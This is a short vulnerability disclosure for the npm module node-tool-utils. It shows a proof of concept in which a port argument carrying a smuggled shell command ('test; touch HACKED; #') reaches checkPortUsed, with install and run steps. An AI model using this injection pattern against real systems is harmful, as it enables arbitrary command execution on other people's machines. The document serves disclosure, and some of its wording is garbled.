# :bug: Description

The `node-tool-utils` module is vulnerable against `RCE` since a command is crafted using `user inputs` not validated and then executedading to `arbitrary command injection`

# :fire: POC

1. Create the following PoC file:

```js
// poc.js
const tool = require('node-tool-utils');
tool.checkPortUsed("test; touch HACKED; #"); //The *port* parameter should be numeric and inserted as 2' argument of

```
2. Check there aren't files called `HACKED` 
3. Execute the following commands in another terminal:

```bash
npm i node-tool-utils # Install affected module
node poc.js #  Run the PoC
```
4. Recheck the files: now `HACKED` has been created
